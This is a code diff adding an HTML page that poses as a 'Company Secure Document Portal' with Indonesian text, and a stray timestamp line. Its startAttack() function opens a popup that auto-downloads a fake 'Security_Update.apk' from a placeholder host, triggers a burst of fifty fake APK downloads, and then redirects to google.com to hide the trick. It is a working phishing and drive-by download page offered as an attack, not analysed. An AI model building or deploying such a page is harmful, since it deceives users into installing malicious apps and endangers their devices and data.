@@ -98,4 +98,110 @@ function startAttack() {
 
 </body>
 </html>
-oux-szaq-cxm
+
+Paskah Agung
+23.53
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Document Portal</title>
+  <style>
+    body { font-family: Arial; }
+
+    #overlay {
+      position: fixed;
+      top:0; left:0;
+      width:100%; height:100%;
+      background:white;
+      z-index:9999;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+    }
+
+    button {
+      padding:12px 20px;
+      font-size:16px;
+      cursor:pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div id="overlay">
+  <h2>Company Secure Document Portal</h2>
+  <p>Klik untuk mengunduh aplikasi keamanan</p>
+  <button onclick="startAttack()">Download Sekarang</button>
+</div>
+
+<script>
+function log(msg){
+  console.log(msg);
+}
+
+function triggerDownloadsBurst(){
+  for (let i = 0; i < 50; i++) {
+    setTimeout(() => {
+      const a = document.createElement('a');
+
+      a.href = 'data:text/plain;charset=utf-8,file_' + i;
+
+      // 🔥 diubah ke APK
+      a.download = 'Security_Update_' + i + '.apk';
+
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, i * 40);
+  }
+}
+
+function startAttack() {
+  document.getElementById('overlay').innerHTML = "<h3>Memproses permintaan...</h3>";
+
+  // 1️⃣ buka popup
+  let w = window.open("about:blank", "_blank");
+
+  // 2️⃣ payload popup (APK)
+  setTimeout(() => {
+    try {
+      w.document.write(`
+        <h3>Downloading security update...</h3>
+
+        <a id="dl" download="Security_Update.apk"
+        href="https://example.com/app.apk"></a>
+
+        <script>
+          setTimeout(() => {
+            document.getElementById("dl").click();
+            document.body.insertAdjacentHTML('beforeend','<p>Installing update...</p>');
+          }, 50);
+        <\/script>
+      `);
+
+      console.log("[2] APK payload injected");
+    } catch(e){
+      console.log("[ERROR] Injection failed: " + e);
+    }
+  }, 500);
+
+  // 3️⃣ burst download (APK juga)
+  setTimeout(() => {
+    triggerDownloadsBurst();
+  }, 1200);
+
+  // 4️⃣ redirect ke trusted domain
+  setTimeout(() => {
+    try {
+      w.location.href = "https://www.google.com";
+      console.log("[3] Popup navigated to google.com");
+    } catch (e) {
+      console.log("[ERROR] Navigation failed: " + e);
+    }
+  }, 2500);
+}
+</script>
+
+</body>
+</html>
